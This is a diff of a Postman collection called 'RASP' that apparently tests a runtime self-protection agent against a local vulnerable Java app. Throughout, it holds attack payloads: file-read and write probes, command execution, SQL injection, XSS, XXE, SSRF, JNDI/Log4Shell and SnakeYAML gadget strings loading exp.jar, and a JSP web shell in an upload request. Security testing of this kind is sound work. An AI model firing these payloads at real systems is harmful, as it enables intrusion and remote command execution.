@@ -1,6 +1,6 @@
 {
 	"info": {
-		"_postman_id": "64811e28-c280-4e89-be45-ff98e75966fa",
+		"_postman_id": "1304085b-b957-4178-8dd9-763d7f6c0433",
 		"name": "RASP",
 		"schema": "https://schema.getpostman.com/json/collection/v2.0.0/collection.json"
 	},
@@ -20,12 +20,11 @@
 										"method": "GET",
 										"header": [],
 										"url": {
-											"raw": "http://{{base_url}}/FileSystem/get/fileInputStreamReadFile.do?file=/etc/ntp.conf",
+											"raw": "http://{{base_url}}/FileSystem/get/fileInputStreamReadFile.do?file=/usr/share/locale/locale.alias",
 											"protocol": "http",
 											"host": [
-												"{{base_host}}"
+												"{{base_url}}"
 											],
-											"port": "{{base_port}}",
 											"path": [
 												"FileSystem",
 												"get",
@@ -34,7 +33,7 @@
 											"query": [
 												{
 													"key": "file",
-													"value": "/etc/ntp.conf"
+													"value": "/usr/share/locale/locale.alias"
 												}
 											]
 										}
@@ -51,7 +50,7 @@
 											"urlencoded": [
 												{
 													"key": "file",
-													"value": "/etc/ntp.conf",
+													"value": "/usr/share/locale/locale.alias",
 													"type": "text"
 												}
 											]
@@ -67,7 +66,7 @@
 										"header": [
 											{
 												"key": "Cookie",
-												"value": "file=/etc/ntp.conf",
+												"value": "file=/usr/share/locale/locale.alias",
 												"type": "text"
 											}
 										],
@@ -82,7 +81,7 @@
 										"header": [
 											{
 												"key": "file",
-												"value": "/etc/ntp.conf",
+												"value": "/usr/share/locale/locale.alias",
 												"type": "text"
 											}
 										],
@@ -97,7 +96,7 @@
 										"header": [],
 										"body": {
 											"mode": "raw",
-											"raw": "{\"file\": \"/etc/ntp.conf\"}",
+											"raw": "{\"file\": \"/usr/share/locale/locale.alias\"}",
 											"options": {
 												"raw": {
 													"language": "json"
@@ -118,7 +117,7 @@
 											"formdata": [
 												{
 													"key": "file",
-													"value": "/etc/ntp.conf",
+													"value": "/usr/share/locale/locale.alias",
 													"type": "text"
 												}
 											]
@@ -138,12 +137,11 @@
 										"method": "GET",
 										"header": [],
 										"url": {
-											"raw": "http://{{base_url}}/FileSystem/get/randomAccessFileReadFile.do?file=/etc/ntp.conf",
+											"raw": "http://{{base_url}}/FileSystem/get/randomAccessFileReadFile.do?file=/usr/share/locale/locale.alias",
 											"protocol": "http",
 											"host": [
-												"{{base_host}}"
+												"{{base_url}}"
 											],
-											"port": "{{base_port}}",
 											"path": [
 												"FileSystem",
 												"get",
@@ -152,7 +150,7 @@
 											"query": [
 												{
 													"key": "file",
-													"value": "/etc/ntp.conf"
+													"value": "/usr/share/locale/locale.alias"
 												}
 											]
 										}
@@ -169,7 +167,7 @@
 											"urlencoded": [
 												{
 													"key": "file",
-													"value": "/etc/ntp.conf",
+													"value": "/usr/share/locale/locale.alias",
 													"type": "text"
 												}
 											]
@@ -185,7 +183,7 @@
 										"header": [
 											{
 												"key": "Cookie",
-												"value": "file=/etc/ntp.conf",
+												"value": "file=/usr/share/locale/locale.alias",
 												"type": "text"
 											}
 										],
@@ -200,7 +198,7 @@
 										"header": [
 											{
 												"key": "file",
-												"value": "/etc/ntp.conf",
+												"value": "/usr/share/locale/locale.alias",
 												"type": "text"
 											}
 										],
@@ -215,7 +213,7 @@
 										"header": [],
 										"body": {
 											"mode": "raw",
-											"raw": "{\"file\": \"/etc/ntp.conf\"}",
+											"raw": "{\"file\": \"/usr/share/locale/locale.alias\"}",
 											"options": {
 												"raw": {
 													"language": "json"
@@ -236,7 +234,7 @@
 											"formdata": [
 												{
 													"key": "file",
-													"value": "/etc/ntp.conf",
+													"value": "/usr/share/locale/locale.alias",
 													"type": "text"
 												}
 											]
@@ -256,12 +254,11 @@
 										"method": "GET",
 										"header": [],
 										"url": {
-											"raw": "http://{{base_url}}/FileSystem/get/filesReadAllBytes.do?file=/etc/ntp.conf",
+											"raw": "http://{{base_url}}/FileSystem/get/filesReadAllBytes.do?file=/usr/share/locale/locale.alias",
 											"protocol": "http",
 											"host": [
-												"{{base_host}}"
+												"{{base_url}}"
 											],
-											"port": "{{base_port}}",
 											"path": [
 												"FileSystem",
 												"get",
@@ -270,7 +267,7 @@
 											"query": [
 												{
 													"key": "file",
-													"value": "/etc/ntp.conf"
+													"value": "/usr/share/locale/locale.alias"
 												}
 											]
 										}
@@ -287,7 +284,7 @@
 											"urlencoded": [
 												{
 													"key": "file",
-													"value": "/etc/ntp.conf",
+													"value": "/usr/share/locale/locale.alias",
 													"type": "text"
 												}
 											]
@@ -303,7 +300,7 @@
 										"header": [
 											{
 												"key": "Cookie",
-												"value": "file=/etc/ntp.conf",
+												"value": "file=/usr/share/locale/locale.alias",
 												"type": "text"
 											}
 										],
@@ -318,7 +315,7 @@
 										"header": [
 											{
 												"key": "file",
-												"value": "/etc/ntp.conf",
+												"value": "/usr/share/locale/locale.alias",
 												"type": "text"
 											}
 										],
@@ -333,7 +330,7 @@
 										"header": [],
 										"body": {
 											"mode": "raw",
-											"raw": "{\"file\": \"/etc/ntp.conf\"}",
+											"raw": "{\"file\": \"/usr/share/locale/locale.alias\"}",
 											"options": {
 												"raw": {
 													"language": "json"
@@ -354,7 +351,7 @@
 											"formdata": [
 												{
 													"key": "file",
-													"value": "/etc/ntp.conf",
+													"value": "/usr/share/locale/locale.alias",
 													"type": "text"
 												}
 											]
@@ -382,9 +379,8 @@
 											"raw": "http://{{base_url}}/FileSystem/get/fileOutStreamWriteFile.do?file=test.jsp&content=test",
 											"protocol": "http",
 											"host": [
-												"{{base_host}}"
+												"{{base_url}}"
 											],
-											"port": "{{base_port}}",
 											"path": [
 												"FileSystem",
 												"get",
@@ -519,9 +515,8 @@
 											"raw": "http://{{base_url}}/FileSystem/get/randomAccessFileWriteFile.do?file=test.jsp&content=test",
 											"protocol": "http",
 											"host": [
-												"{{base_host}}"
+												"{{base_url}}"
 											],
-											"port": "{{base_port}}",
 											"path": [
 												"FileSystem",
 												"get",
@@ -656,9 +651,8 @@
 											"raw": "http://{{base_url}}/FileSystem/get/filesWrite.do?file=test.jsp&content=test",
 											"protocol": "http",
 											"host": [
-												"{{base_host}}"
+												"{{base_url}}"
 											],
-											"port": "{{base_port}}",
 											"path": [
 												"FileSystem",
 												"get",
@@ -795,9 +789,8 @@
 									"raw": "http://{{base_url}}/FileSystem/get/deleteFile.do?file=./1.txt",
 									"protocol": "http",
 									"host": [
-										"{{base_host}}"
+										"{{base_url}}"
 									],
-									"port": "{{base_port}}",
 									"path": [
 										"FileSystem",
 										"get",
@@ -913,9 +906,8 @@
 									"raw": "http://{{base_url}}/FileSystem/get/renameTo.do?file=1.txt&dest=1.jsp",
 									"protocol": "http",
 									"host": [
-										"{{base_host}}"
+										"{{base_url}}"
 									],
-									"port": "{{base_port}}",
 									"path": [
 										"FileSystem",
 										"get",
@@ -1050,9 +1042,8 @@
 									"raw": "http://{{base_url}}/FileSystem/get/filesCopy.do?file=1.txt&dest=1.jsp",
 									"protocol": "http",
 									"host": [
-										"{{base_host}}"
+										"{{base_url}}"
 									],
-									"port": "{{base_port}}",
 									"path": [
 										"FileSystem",
 										"get",
@@ -1187,9 +1178,8 @@
 									"raw": "http://{{base_url}}/FileSystem/get/listFile.do?dir=/usr",
 									"protocol": "http",
 									"host": [
-										"{{base_host}}"
+										"{{base_url}}"
 									],
-									"port": "{{base_port}}",
 									"path": [
 										"FileSystem",
 										"get",
@@ -1310,9 +1300,8 @@
 									"raw": "http://{{base_url}}/CMD/get/cmd.do?cmd=whoami",
 									"protocol": "http",
 									"host": [
-										"{{base_host}}"
+										"{{base_url}}"
 									],
-									"port": "{{base_port}}",
 									"path": [
 										"CMD",
 										"get",
@@ -1428,9 +1417,8 @@
 									"raw": "http://{{base_url}}/CMD/get/unixProcess.do?cmd=whoami",
 									"protocol": "http",
 									"host": [
-										"{{base_host}}"
+										"{{base_url}}"
 									],
-									"port": "{{base_port}}",
 									"path": [
 										"CMD",
 										"get",
@@ -1548,9 +1536,8 @@
 							"raw": "http://{{base_url}}/SQL/get/sql.do?username='/**/or/**/username='root",
 							"protocol": "http",
 							"host": [
-								"{{base_host}}"
+								"{{base_url}}"
 							],
-							"port": "{{base_port}}",
 							"path": [
 								"SQL",
 								"get",
@@ -1666,9 +1653,8 @@
 							"raw": "http://{{base_url}}/XSS/get/xss.do?str=<script>alert(document.cookie)</script>",
 							"protocol": "http",
 							"host": [
-								"{{base_host}}"
+								"{{base_url}}"
 							],
-							"port": "{{base_port}}",
 							"path": [
 								"XSS",
 								"get",
@@ -1838,16 +1824,15 @@
 							"raw": "http://{{base_url}}/rasp.action?redirect:https://www.baidu.com/",
 							"protocol": "http",
 							"host": [
-								"{{base_host}}"
+								"{{base_url}}"
 							],
-							"port": "{{base_port}}",
 							"path": [
 								"rasp.action"
 							],
 							"query": [
 								{
 									"key": "redirect:https://www.baidu.com/",
-									"value": null
+									"value": ""
 								}
 							]
 						}
@@ -2017,9 +2002,8 @@
 							"raw": "http://{{base_url}}/Test/test.do?name=test",
 							"protocol": "http",
 							"host": [
-								"{{base_host}}"
+								"{{base_url}}"
 							],
-							"port": "{{base_port}}",
 							"path": [
 								"Test",
 								"test.do"
@@ -2051,9 +2035,8 @@
 									"raw": "http://{{base_url}}/XXE/get/xerces.do?xml=<!DOCTYPE+test+%5b<!ELEMENT+test+ANY+><!ENTITY+title+SYSTEM+\"file%3a%2f%2f%2f%2f%2f%2f%2fusr\"+>%5d><article><title>%26title%3b<%2ftitle><%2farticle>",
 									"protocol": "http",
 									"host": [
-										"{{base_host}}"
+										"{{base_url}}"
 									],
-									"port": "{{base_port}}",
 									"path": [
 										"XXE",
 										"get",
@@ -2169,9 +2152,8 @@
 									"raw": "http://{{base_url}}/XXE/get/dom4j.do?xml=<!DOCTYPE+test+%5b<!ELEMENT+test+ANY+><!ENTITY+title+SYSTEM+\"file%3a%2f%2f%2f%2f%2f%2f%2fusr\"+>%5d><article><name>%26title%3b<%2fname><%2farticle>",
 									"protocol": "http",
 									"host": [
-										"{{base_host}}"
+										"{{base_url}}"
 									],
-									"port": "{{base_port}}",
 									"path": [
 										"XXE",
 										"get",
@@ -2292,9 +2274,8 @@
 									"raw": "http://{{base_url}}/SSRF/get/httpConnection.do?url=https://www.baidu.com",
 									"protocol": "http",
 									"host": [
-										"{{base_host}}"
+										"{{base_url}}"
 									],
-									"port": "{{base_port}}",
 									"path": [
 										"SSRF",
 										"get",
@@ -2410,9 +2391,8 @@
 									"raw": "http://{{base_url}}/SSRF/get/okHttp3.do?url=https://www.baidu.com",
 									"protocol": "http",
 									"host": [
-										"{{base_host}}"
+										"{{base_url}}"
 									],
-									"port": "{{base_port}}",
 									"path": [
 										"SSRF",
 										"get",
@@ -2528,9 +2508,8 @@
 									"raw": "http://{{base_url}}/SSRF/get/httpClient.do?url=https://www.baidu.com",
 									"protocol": "http",
 									"host": [
-										"{{base_host}}"
+										"{{base_url}}"
 									],
-									"port": "{{base_port}}",
 									"path": [
 										"SSRF",
 										"get",
@@ -2738,7 +2717,7 @@
 					"request": {
 						"method": "GET",
 						"header": [],
-						"url": "http://10.10.99.2:{{base_port}}/Blacklist/blacklist.do"
+						"url": "http://10.10.99.2:8001/Blacklist/blacklist.do"
 					},
 					"response": []
 				}
@@ -2752,7 +2731,7 @@
 					"request": {
 						"method": "GET",
 						"header": [],
-						"url": "http://10.10.99.2:{{base_port}}/Blacklist/url.do"
+						"url": "http://{{base_url}}/Blacklist/url.do"
 					},
 					"response": []
 				}
@@ -2767,15 +2746,11 @@
 						"method": "GET",
 						"header": [],
 						"url": {
-							"raw": "http://10.10.99.2:{{base_port}}/Whitelist/url.do?xss=%3Cscript%3Ealert(%2Fxss%2F)%3B%3C%2Fscript%3E",
+							"raw": "http://{{base_url}}/Whitelist/url.do?xss=%3Cscript%3Ealert(%2Fxss%2F)%3B%3C%2Fscript%3E",
 							"protocol": "http",
 							"host": [
-								"10",
-								"10",
-								"99",
-								"2"
+								"{{base_url}}"
 							],
-							"port": "{{base_port}}",
 							"path": [
 								"Whitelist",
 								"url.do"
@@ -2808,12 +2783,11 @@
 								"method": "GET",
 								"header": [],
 								"url": {
-									"raw": "http://{{base_url}}/JNDI/get/lookup.do?url=ldap://127.0.0.1:8888/test",
+									"raw": "http://{{base_url}}/JNDI/get/lookup.do?url=ldap://localhost:8888/test",
 									"protocol": "http",
 									"host": [
-										"{{base_host}}"
+										"{{base_url}}"
 									],
-									"port": "{{base_port}}",
 									"path": [
 										"JNDI",
 										"get",
@@ -2822,7 +2796,7 @@
 									"query": [
 										{
 											"key": "url",
-											"value": "ldap://127.0.0.1:8888/test"
+											"value": "ldap://localhost:8888/test"
 										}
 									]
 								}
@@ -2932,7 +2906,7 @@
 						"header": [],
 						"body": {
 							"mode": "raw",
-							"raw": "{\"root\": {\"userId\": \"${jndi:ldap://127.0.0.1:8888}\"}}",
+							"raw": "{\"root\": {\"userId\": \"${jndi:ldap://localhost:8888}\"}}",
 							"options": {
 								"raw": {
 									"language": "json"
@@ -2955,7 +2929,7 @@
 						"header": [],
 						"body": {
 							"mode": "raw",
-							"raw": "{\"xml\": \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://127.0.0.1:8888/exp.jar']]]]\"}",
+							"raw": "{\"xml\": \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://localhost:8888/exp.jar']]]]\"}",
 							"options": {
 								"raw": {
 									"language": "json"
@@ -3002,7 +2976,7 @@
 						"header": [],
 						"body": {
 							"mode": "raw",
-							"raw": "{\"req\":\"POST /FileUpload/upload.do HTTP/1.1\\nHost: 10.10.99.2:{{base_port}}\\nContent-Length: 539\\nCache-Control: max-age=0\\nUpgrade-Insecure-Requests: 1\\nOrigin: null\\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryWqGd83IIbg2U327I\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\\nConnection: close\\n\\n------WebKitFormBoundaryWqGd83IIbg2U327I\\nContent-Disposition: form-data; name=\\\"username\\\"\\n\\nadmin\\n------WebKitFormBoundaryWqGd83IIbg2U327I\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\"=?UTF-8?Q?=E6=B5=8B=E8=AF=95=2Ejsp?=\\\"\\nContent-Type: application/octet-stream\\n\\n<%=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(request.getParameter(\\\"cmd\\\")).getInputStream())%>\\n------WebKitFormBoundaryWqGd83IIbg2U327I\\nContent-Disposition: form-data; name=\\\"submit\\\"\\n\\nSubmit\\n------WebKitFormBoundaryWqGd83IIbg2U327I--\\n\"}",
+							"raw": "{\"req\":\"POST /FileUpload/upload.do HTTP/1.1\\nHost: localhost:8001\\nContent-Length: 539\\nCache-Control: max-age=0\\nUpgrade-Insecure-Requests: 1\\nOrigin: null\\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryWqGd83IIbg2U327I\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\\nConnection: close\\n\\n------WebKitFormBoundaryWqGd83IIbg2U327I\\nContent-Disposition: form-data; name=\\\"username\\\"\\n\\nadmin\\n------WebKitFormBoundaryWqGd83IIbg2U327I\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\"=?UTF-8?Q?=E6=B5=8B=E8=AF=95=2Ejsp?=\\\"\\nContent-Type: application/octet-stream\\n\\n<%=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(request.getParameter(\\\"cmd\\\")).getInputStream())%>\\n------WebKitFormBoundaryWqGd83IIbg2U327I\\nContent-Disposition: form-data; name=\\\"submit\\\"\\n\\nSubmit\\n------WebKitFormBoundaryWqGd83IIbg2U327I--\\n\", \"protocol\": \"http\"}",
 							"options": {
 								"raw": {
 									"language": "json"
@@ -3014,6 +2988,32 @@
 					"response": []
 				}
 			]
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "base_url",
+			"value": "localhost:8001"
 		}
 	]
 }
